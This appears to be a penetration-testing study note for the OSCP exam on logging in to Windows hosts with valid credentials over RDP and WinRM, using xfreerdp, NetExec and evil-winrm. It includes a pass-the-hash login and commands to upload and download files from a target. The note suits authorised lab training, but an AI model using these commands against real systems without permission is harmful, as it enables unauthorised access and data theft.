# RDP & WinRM — Remote Access (OSCP)

Both = **credentialed remote access to Windows**. You have valid creds → which port is open?

|           | RDP              | WinRM                                        |
| --------- | ---------------- | -------------------------------------------- |
| Port      | 3389             | 5985 (HTTP) / 5986 (HTTPS)                   |
| Gives     | Full GUI desktop | Command-line shell                           |
| Tool      | `xfreerdp`       | `evil-winrm`                                 |
| Pre-check | —                | `nxc winrm <IP> -u u -p p` → need `(Pwn3d!)` |

---

## RDP (3389) — GUI

```bash
xfreerdp /v:<IP> /u:<user> /p:<password> /cert:ignore +clipboard
```
- `/cert:ignore` → skip cert errors
- `+clipboard` → copy/paste files & commands

---

## WinRM (5985/5986) — Shell

**1. Check access first** (don't blind-connect):
```bash
nxc winrm <IP> -u <user> -p <password>
```
- `[+] user:pass` → valid creds, **no shell** (not in Remote Management Users)
- `[+] user:pass (Pwn3d!)` → **shell available** ✅

**2. Connect:**
```bash
evil-winrm -i <IP> -u <user> -p <password>
```
Pass-the-hash (have NTLM, no password):
```bash
evil-winrm -i <IP> -u <user> -H <NTLM_HASH>
```

**3. Inside the shell:**
```
upload /path/local.exe      # Kali → target
download C:\loot.txt        # target → Kali
```
- User flag: `C:\Users\<user>\Desktop\local.txt` (PG: `proof.txt`)

---

## Related Notes
- [[NetExec]]
- [[CrackMapExec]]
- [[Password_Spraying]]
- [[Impacket]]
